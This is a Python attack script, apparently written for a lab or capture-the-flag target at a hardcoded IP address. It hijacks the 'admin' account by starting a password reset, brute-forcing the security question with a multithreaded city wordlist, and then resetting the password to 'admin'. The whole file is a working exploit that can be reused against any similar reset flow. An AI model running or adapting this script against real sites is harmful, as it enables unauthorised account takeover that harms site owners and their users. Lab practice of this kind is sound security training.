#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

def tryCountry(session, securityQuestionURL, securityQuestionPostData, proxies):
    errorMessage = "Incorrect response"
    securityQuestionResponse = session.post(securityQuestionURL, data=securityQuestionPostData, proxies=None, verify=False)

    if errorMessage not in securityQuestionResponse.text:
        country = securityQuestionPostData['security_response']
        return country
    return None

if __name__ == "__main__":
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    baseURL = 'http://83.136.248.118:39297'
    resetURL = baseURL + '/reset.php'

    session = requests.Session()
    resetPostData = {"username":"admin"}
    postResponse = session.post(resetURL, data=resetPostData, proxies=None, verify=False)

    success_pattern = r"<b>.*admin, please provide the answer to.*</b>"
    if re.search(success_pattern, postResponse.text):
        print(f"[+] Reset successful - {re.search(success_pattern, postResponse.text).group()}")

        with open("city_wordlist.txt", "r") as wordlist:
            words = [line.strip() for line in wordlist.readlines()]
            batchSize = 1000
            maxRange = len(words)
            maxThreads = 50
            
            for batch_start in range(0, maxRange + 1, batchSize):
                with ThreadPoolExecutor(max_workers=maxThreads) as executor:
                    futures = []
                    for i in range(batch_start, min(batch_start + batchSize, maxRange)):
                        word = words[i]
                        securityQuestionPostData = {"security_response": word}
                        securityQuestionURL = baseURL + '/security_question.php'

                        futures.append(executor.submit(
                            tryCountry, 
                            session, 
                            securityQuestionURL, 
                            securityQuestionPostData, 
                            proxies))

                    for future in as_completed(futures):
                        try:
                            response = future.result()
                            if response:
                                print(f"[+] Found country: {response}")

                                resetPwd = baseURL + '/reset_password.php'
                                resetPwdPostData = {"password": "admin"}
                                resetPwdResponse = session.post(resetPwd, data=resetPwdPostData, proxies=None, verify=False)
                                successMessage = "password for the user admin has been reset"

                                if successMessage in resetPwdResponse.text:
                                    print("[+] You can now login as admin with password 'admin'")
                                else:
                                    print("[-] Password reset failed, exiting.")
                                exit()
                        except Exception as e:
                            print(f"[-] Error occurred: {e}")
                            exit()
    else:
        print("[-] Reset failed, exiting.")
        exit()
